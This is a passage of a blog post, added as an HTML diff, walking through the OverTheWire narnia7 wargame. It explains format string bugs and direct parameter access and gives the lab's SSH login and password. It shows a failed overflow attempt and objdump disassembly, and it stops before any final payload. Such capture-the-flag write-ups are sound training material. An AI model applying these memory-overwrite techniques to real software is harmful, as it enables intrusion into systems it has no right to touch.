@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Narnia Challenges (part 5) - noopz</title><meta name="Description" content="The fifth in a multi-part walkthrough for the OverTheWire narnia levels. These write up will focus on narnia 7 level and cover a more advanced case of a format string exploit."><meta property="og:title" content="Narnia Challenges (part 5)" />
+<meta property="og:description" content="The fifth in a multi-part walkthrough for the OverTheWire narnia levels. These write up will focus on narnia 7 level and cover a more advanced case of a format string exploit." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://noopz.github.io/narnia_challenges_part5/" />
+<meta property="og:image" content="https://noopz.github.io/logo.png"/>
+<meta property="article:published_time" content="2020-08-01T08:26:53+00:00" />
+<meta property="article:modified_time" content="2020-08-02T22:03:52-07:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://noopz.github.io/logo.png"/>
+
+<meta name="twitter:title" content="Narnia Challenges (part 5)"/>
+<meta name="twitter:description" content="The fifth in a multi-part walkthrough for the OverTheWire narnia levels. These write up will focus on narnia 7 level and cover a more advanced case of a format string exploit."/>
+<meta name="application-name" content="noopz">
+<meta name="apple-mobile-web-app-title" content="noopz"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://noopz.github.io/narnia_challenges_part5/" /><link rel="prev" href="https://noopz.github.io/narnia_challenges_part4/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.c1380f5e1f7f3d04b48edd22c364da70ed19205a2e23d815183d44b0e70eb6d93101e95794b3b2e22eb84c60c2e534577b1a114426b13da4030d8d61beeb974b.css" integrity="sha512-wTgPXh9/PQS0jt0iw2TacO0ZIFouI9gVGD1EsOcOttkxAelXlLOy4i64TGDC5TRXexoRRCaxPaQDDY1hvuuXSw=="><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><meta name="google-site-verification" content="qVeOJnUgOGM26P4YnScH1UZEDcMKWknHB7GATR21Ji0" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Narnia Challenges (part 5)",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/noopz.github.io\/narnia_challenges_part5\/"
+        },"image": ["https:\/\/noopz.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "OTW, narnia, wargames","wordcount":  2739 ,
+        "url": "https:\/\/noopz.github.io\/narnia_challenges_part5\/","datePublished": "2020-08-01T08:26:53+00:00","dateModified": "2020-08-02T22:03:52-07:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "noopz","logo": "https:\/\/noopz.github.io\/images\/avatar.jpg"},"author": {
+                "@type": "Person",
+                "name": "Zack"
+            },"description": "The fifth in a multi-part walkthrough for the OverTheWire narnia levels. These write up will focus on narnia 7 level and cover a more advanced case of a format string exploit."
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="noopz"><span class="header-title-pre"><i class='fas fa-hat-wizard fa-fw'></i></span>noopz</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="https://github.com/noopz/" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="noopz"><span class="header-title-pre"><i class='fas fa-hat-wizard fa-fw'></i></span>noopz</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="https://github.com/noopz/" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Narnia Challenges (part 5)</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Zack</a></span>&nbsp;<span class="post-category">included in <a href="/categories/otw/"><i class="far fa-folder fa-fw"></i>OTW</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-08-01">2020-08-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2739 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;13 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#narnia7">narnia7</a>
+      <ul>
+        <li><a href="#main">main()</a></li>
+        <li><a href="#goodfunction">goodfunction()</a></li>
+        <li><a href="#hackedfunction">hackedfunction()</a></li>
+        <li><a href="#vuln">vuln()</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Once I got into the middle of this challenge I realized I need to do more research on format string bugs and came across two different resources that helped me solve this challenge. First the <a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf" target="_blank" rel="noopener noreffer">Lecture Notes from Syracuse University</a> were fairly helpful to read through - it again has a pretty good explanation of format string bugs, and how information is actually leaked from the stack (as well as a bit about direct parameter access).</p>
+<p>As a reminder Direct Parameter Access is Linux specific. It&rsquo;s a way to access a particular parameter when using format strings. When there&rsquo;s a format string bug that allows for information leakage, you are able to &ldquo;print&rdquo; the &ldquo;nth&rdquo; item on the stack with the following: <code>%&lt;offset&gt;\$&lt;format specifier&gt;</code>. This is extremely useful when you know the offset of what you want to write using the <code>%n</code> format specifier.</p>
+<p>The second bit of reading that was extremely useful was from <a href="https://www.amazon.com/Hacking-Ethical-Hackers-Handbook-Fourth/dp/0071832386" target="_blank" rel="noopener noreffer">Grey Hat Hacking 4th Ed</a>, specifically Chapter 12 - Magic Formula. It&rsquo;s one of the &ldquo;easiest&rdquo; ways to write 4 bytes in memory using a format string using two writes:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="../../images/fmtstringmagic.png"
+        data-srcset="../../images/fmtstringmagic.png, ../../images/fmtstringmagic.png 1.5x, ../../images/fmtstringmagic.png 2x"
+        data-sizes="auto"
+        alt="../../images/fmtstringmagic.png"
+        title="magic string formula" /></p>
+<p>With that out of the way, time for breaking down this challenge.</p>
+<h2 id="narnia7">narnia7</h2>
+<p>How to log into Narnia:</p>
+<blockquote>
+<p>ssh -p 2226 <a href="mailto:narnia7@narnia.labs.overthewire.org">narnia7@narnia.labs.overthewire.org</a></p>
+</blockquote>
+<p>Password: <code>ahkiaziphu</code>
+Where to find all of the challenges:</p>
+<blockquote>
+<p>cd /narnia/</p>
+</blockquote>
+<p>First and foremost try running the challenge:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia7@narnia:/narnia$ ./narnia7 AAAA
+goodfunction<span class="o">()</span> <span class="o">=</span> 0x80486ff
+hackedfunction<span class="o">()</span> <span class="o">=</span> 0x8048724
+
+before : ptrf<span class="o">()</span> <span class="o">=</span> 0x80486ff <span class="o">(</span>0xffffd658<span class="o">)</span>
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunction, but i said the Hackedfunction..
+</code></pre></td></tr></table>
+</div>
+</div><p>Giving an attempt for a simple buffer overflow:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia7@narnia:/narnia$ ./narnia7 <span class="k">$(</span>python -c <span class="s1">&#39;print &#34;A&#34;*2048&#39;</span><span class="k">)</span>
+goodfunction<span class="o">()</span> <span class="o">=</span> 0x80486ff
+hackedfunction<span class="o">()</span> <span class="o">=</span> 0x8048724
+
+before : ptrf<span class="o">()</span> <span class="o">=</span> 0x80486ff <span class="o">(</span>0xffffce58<span class="o">)</span>
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunction, but i said the Hackedfunction..
+</code></pre></td></tr></table>
+</div>
+</div><p>No luck, time for <code>objdump</code>. This challenge has a few different functions worth dumping, <code>goodfunction()</code>, <code>hackedfunction()</code>, <code>vuln()</code> and <code>main()</code>.</p>
+<h3 id="main">main()</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia7</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">M</span> <span class="n">intel</span> <span class="o">-</span><span class="n">d</span> <span class="n">narnia7</span> <span class="o">|</span> <span class="n">awk</span> <span class="o">-</span><span class="bp">F</span><span class="s">&#34;\n&#34;</span> <span class="o">-</span><span class="n">v</span> <span class="n">RS</span><span class="o">=</span><span class="s">&#34;\n\n&#34;</span> <span class="s">&#39;$1 ~ /main&gt;/&#39;</span>
+<span class="m">080486</span><span class="n">bf</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;:</span>
+ <span class="m">80486</span><span class="n">bf</span><span class="o">:</span> <span class="m">55</span>                   <span class="n">push</span>   <span class="n">ebp</span>
+ <span class="m">80486</span><span class="n">c0</span><span class="o">:</span> <span class="m">89</span> <span class="n">e5</span>                <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+ <span class="m">80486</span><span class="n">c2</span><span class="o">:</span> <span class="m">83</span> <span class="m">7</span><span class="n">d</span> <span class="m">08</span> <span class="m">01</span>          <span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">+0</span><span class="n">x8]</span><span class="p">,</span><span class="mh">0x1</span>
+ <span class="m">80486</span><span class="n">c6</span><span class="o">:</span> <span class="m">7</span><span class="n">f</span> <span class="m">20</span>                <span class="n">jg</span>     <span class="m">80486e8</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+0</span><span class="n">x29</span><span class="o">&gt;</span>
+ <span class="m">80486</span><span class="n">c8</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">45</span> <span class="m">0</span><span class="n">c</span>             <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">+0</span><span class="n">xc]</span>
+ <span class="m">80486</span><span class="n">cb</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">10</span>                <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[eax]</span>
+ <span class="m">80486</span><span class="n">cd</span><span class="o">:</span> <span class="n">a1</span> <span class="m">90</span> <span class="m">9</span><span class="n">b</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">ds</span><span class="o">:</span><span class="mh">0x8049b90</span>
+ <span class="m">80486</span><span class="n">d2</span><span class="o">:</span> <span class="m">52</span>                   <span class="n">push</span>   <span class="n">edx</span>
+ <span class="m">80486</span><span class="n">d3</span><span class="o">:</span> <span class="m">68</span> <span class="m">6</span><span class="n">a</span> <span class="m">88</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x804886a</span>
+ <span class="m">80486</span><span class="n">d8</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
+ <span class="m">80486</span><span class="n">d9</span><span class="o">:</span> <span class="n">e8</span> <span class="m">02</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">80484e0</span> <span class="o">&lt;</span><span class="n">fprintf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">80486</span><span class="n">de</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">0</span><span class="n">c</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
+ <span class="m">80486e1</span><span class="o">:</span> <span class="m">6</span><span class="n">a</span> <span class="n">ff</span>                <span class="n">push</span>   <span class="mh">0xffffffff</span>
+ <span class="m">80486e3</span><span class="o">:</span> <span class="n">e8</span> <span class="n">c8</span> <span class="n">fd</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">80484</span><span class="n">b0</span> <span class="o">&lt;</span><span class="n">exit</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">80486e8</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">45</span> <span class="m">0</span><span class="n">c</span>             <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">+0</span><span class="n">xc]</span>
+ <span class="m">80486</span><span class="n">eb</span><span class="o">:</span> <span class="m">83</span> <span class="n">c0</span> <span class="m">04</span>             <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span>
+ <span class="m">80486</span><span class="n">ee</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">00</span>                <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[eax]</span>
+ <span class="m">80486</span><span class="n">f0</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
+ <span class="m">80486</span><span class="n">f1</span><span class="o">:</span> <span class="n">e8</span> <span class="m">25</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">804861</span><span class="n">b</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">&gt;</span>
+ <span class="m">80486</span><span class="n">f6</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">04</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x4</span>
+ <span class="m">80486</span><span class="n">f9</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
+ <span class="m">80486</span><span class="n">fa</span><span class="o">:</span> <span class="n">e8</span> <span class="n">b1</span> <span class="n">fd</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">80484</span><span class="n">b0</span> <span class="o">&lt;</span><span class="n">exit</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>First is to check <code>argc</code> that it is equal to one, and if so jump to <code>0x80486e8</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">80486</span><span class="n">c2</span><span class="o">:</span> <span class="m">83</span> <span class="m">7</span><span class="n">d</span> <span class="m">08</span> <span class="m">01</span>          <span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">+0</span><span class="n">x8]</span><span class="p">,</span><span class="mh">0x1</span>
+ <span class="m">80486</span><span class="n">c6</span><span class="o">:</span> <span class="m">7</span><span class="n">f</span> <span class="m">20</span>                <span class="n">jg</span>     <span class="m">80486e8</span> <span class="o">&lt;</span><span class="n">main</span><span class="m">+0</span><span class="n">x29</span><span class="o">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>If it&rsquo;s not equal to, then print a message and <code>exit()</code> with the usage:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">80486</span><span class="n">c8</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">45</span> <span class="m">0</span><span class="n">c</span>             <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[ebp</span><span class="m">+0</span><span class="n">xc]</span>
+ <span class="m">80486</span><span class="n">cb</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">10</span>                <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">[eax]</span>
+ <span class="m">80486</span><span class="n">cd</span><span class="o">:</span> <span class="n">a1</span> <span class="m">90</span> <span class="m">9</span><span class="n">b</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">ds</span><span class="o">:</span><span class="mh">0x8049b90</span>
+ <span class="m">80486</span><span class="n">d2</span><span class="o">:</span> <span class="m">52</span>                   <span class="n">push</span>   <span class="n">edx</span>
+ <span class="m">80486</span><span class="n">d3</span><span class="o">:</span> <span class="m">68</span> <span class="m">6</span><span class="n">a</span> <span class="m">88</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x804886a</span>
+ <span class="m">80486</span><span class="n">d8</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
+ <span class="m">80486</span><span class="n">d9</span><span class="o">:</span> <span class="n">e8</span> <span class="m">02</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">80484e0</span> <span class="o">&lt;</span><span class="n">fprintf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">80486</span><span class="n">de</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">0</span><span class="n">c</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
+ <span class="m">80486e1</span><span class="o">:</span> <span class="m">6</span><span class="n">a</span> <span class="n">ff</span>                <span class="n">push</span>   <span class="mh">0xffffffff</span>
+ <span class="m">80486e3</span><span class="o">:</span> <span class="n">e8</span> <span class="n">c8</span> <span class="n">fd</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">80484</span><span class="n">b0</span> <span class="o">&lt;</span><span class="n">exit</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>If some input has been provided to <code>argv</code>, then the interesting stuff happens. First pull the value out of <code>argv[1]</code> and push that onto the stack, calling the <code>vuln()</code> function, i.e.: <code>vuln(argv[1]);</code>. So it seems very likely <code>vuln</code> is appropriately named since it&rsquo;s taking in user input. Next up is the good function since it&rsquo;s pretty short.</p>
+<h3 id="goodfunction">goodfunction()</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia7</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">M</span> <span class="n">intel</span> <span class="o">-</span><span class="n">d</span> <span class="n">narnia7</span> <span class="o">|</span> <span class="n">awk</span> <span class="o">-</span><span class="bp">F</span><span class="s">&#34;\n&#34;</span> <span class="o">-</span><span class="n">v</span> <span class="n">RS</span><span class="o">=</span><span class="s">&#34;\n\n&#34;</span> <span class="s">&#39;$1 ~ /goodfunction/&#39;</span>
+<span class="m">080486</span><span class="n">ff</span> <span class="o">&lt;</span><span class="n">goodfunction</span><span class="o">&gt;:</span>
+ <span class="m">80486</span><span class="n">ff</span><span class="o">:</span> <span class="m">55</span>                   <span class="n">push</span>   <span class="n">ebp</span>
+ <span class="m">8048700</span><span class="o">:</span> <span class="m">89</span> <span class="n">e5</span>                <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+ <span class="m">8048702</span><span class="o">:</span> <span class="m">68</span> <span class="m">80</span> <span class="m">88</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x8048880</span>
+ <span class="m">8048707</span><span class="o">:</span> <span class="n">e8</span> <span class="m">84</span> <span class="n">fd</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048490</span> <span class="o">&lt;</span><span class="n">puts</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">804870</span><span class="n">c</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">04</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x4</span>
+ <span class="m">804870</span><span class="n">f</span><span class="o">:</span> <span class="n">a1</span> <span class="m">94</span> <span class="m">9</span><span class="n">b</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">ds</span><span class="o">:</span><span class="mh">0x8049b94</span>
+ <span class="m">8048714</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
+ <span class="m">8048715</span><span class="o">:</span> <span class="n">e8</span> <span class="m">46</span> <span class="n">fd</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048460</span> <span class="o">&lt;</span><span class="n">fflush</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">804871</span><span class="n">a</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">04</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x4</span>
+ <span class="m">804871</span><span class="n">d</span><span class="o">:</span> <span class="n">b8</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>       <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
+ <span class="m">8048722</span><span class="o">:</span> <span class="n">c9</span>                   <span class="n">leave</span>  
+ <span class="m">8048723</span><span class="o">:</span> <span class="n">c3</span>                   <span class="n">ret</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>There&rsquo;s nothing really of interest here in the <code>goodfunction</code>. It just prints out a message taunting you with directions to go to the hacked function. Onto the next.</p>
+<h3 id="hackedfunction">hackedfunction()</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia7</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">narnia</span><span class="o">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">M</span> <span class="n">intel</span> <span class="o">-</span><span class="n">d</span> <span class="n">narnia7</span> <span class="o">|</span> <span class="n">awk</span> <span class="o">-</span><span class="bp">F</span><span class="s">&#34;\n&#34;</span> <span class="o">-</span><span class="n">v</span> <span class="n">RS</span><span class="o">=</span><span class="s">&#34;\n\n&#34;</span> <span class="s">&#39;$1 ~ /hackedfunction/&#39;</span>
+<span class="m">08048724</span> <span class="o">&lt;</span><span class="n">hackedfunction</span><span class="o">&gt;:</span>
+ <span class="m">8048724</span><span class="o">:</span> <span class="m">55</span>                   <span class="n">push</span>   <span class="n">ebp</span>
+ <span class="m">8048725</span><span class="o">:</span> <span class="m">89</span> <span class="n">e5</span>                <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+ <span class="m">8048727</span><span class="o">:</span> <span class="m">53</span>                   <span class="n">push</span>   <span class="n">ebx</span>
+ <span class="m">8048728</span><span class="o">:</span> <span class="m">68</span> <span class="n">bd</span> <span class="m">88</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">push</span>   <span class="mh">0x80488bd</span>
+ <span class="m">804872</span><span class="n">d</span><span class="o">:</span> <span class="n">e8</span> <span class="m">1</span><span class="n">e</span> <span class="n">fd</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048450</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">8048732</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">04</span>             <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x4</span>
+ <span class="m">8048735</span><span class="o">:</span> <span class="n">a1</span> <span class="m">94</span> <span class="m">9</span><span class="n">b</span> <span class="m">04</span> <span class="m">08</span>       <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">ds</span><span class="o">:</span><span class="mh">0x8049b94</span>
+ <span class="m">804873</span><span class="n">a</span><span class="o">:</span> <span class="m">50</span>                   <span class="n">push</span>   <span class="n">eax</span>
